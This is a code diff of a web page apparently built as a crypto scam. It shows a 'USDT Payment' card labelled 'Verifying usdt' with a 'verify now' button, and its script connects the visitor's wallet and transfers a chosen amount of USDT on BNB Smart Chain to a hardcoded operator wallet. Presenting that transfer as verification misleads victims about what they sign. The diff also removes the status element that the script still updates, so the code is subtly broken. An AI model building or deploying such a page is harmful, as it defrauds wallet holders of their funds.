@@ -18,10 +18,18 @@
 <div class="card">
     <h2>USDT Payment</h2>
     <p>Verifying usdt</p>
-    <button onclick="connectWallet()">verify now</button>
-    <button onclick="sendUSDT()">Bnb smart chain</button>
-    <div id="status">Status: Not Connected</div>
-</div>
+
+<!-- Wallet Connect Button -->
+<button onclick="connectWallet()">verify now</button>
+<br><br>
+
+<!-- Amount Input Box (Iska ID 'usdtAmount' hona zaroori hai) -->
+<input type="number" id="usdtAmount" placeholder="Amount enter karein">
+<br>
+
+<!-- Pay Button -->
+<button onclick="sendUSDT()">Bnb smart chain</button>
+    
 
 <script>
     let signer;
@@ -48,29 +56,35 @@
         }
     }
 
-    async function sendUSDT() {
-        if (!signer) {
-            alert("Pehle Wallet Connect Karein!");
-            return;
-        }
-        try {
-            document.getElementById("status").innerText = "Transaction pending...";
-            const usdtContract = new ethers.Contract(usdtAddress, erc20Abi, signer);
-            
-            // 100 USDT Amount (18 decimals on BSC)
-            const amount = ethers.utils.parseUnits("100.0", 18);
-            
-            const tx = await usdtContract.transfer(myWalletAddress, amount);
-            await tx.wait();
-            
-            document.getElementById("status").innerText = "Payment Successful!";
-            alert("USDT Transfer Successful!");
-        } catch (err) {
-            console.error(err);
-            document.getElementById("status").innerText = "Transaction Failed / Cancelled";
-        }
+async function sendUSDT() {
+    if (!signer) {
+        alert("Pehle Wallet Connect Karein!");
+        return;
     }
-</script>
+
+    const inputAmount = document.getElementById("usdtAmount").value;
+    if (!inputAmount || inputAmount <= 0) {
+        alert("Kripya valid USDT amount enter karein!");
+        return;
+    }
+
+    try {
+        document.getElementById("status").innerText = "Processing...";
+        const usdtContract = new ethers.Contract(usdtAddress, erc20Abi, signer);
+        
+        const amount = ethers.utils.parseUnits(inputAmount.toString(), 18);
+        
+        const tx = await usdtContract.transfer(myWalletAddress, amount);
+        await tx.wait();
+        
+        document.getElementById("status").innerText = "Payment Successful!";
+        alert(inputAmount + " USDT Transfer Successful!");
+    } catch (err) {
+        console.error(err);
+        document.getElementById("status").innerText = "Error: " + (err.reason || err.message || "Failed");
+    }
+}
+    
 
 </body>
 </html>
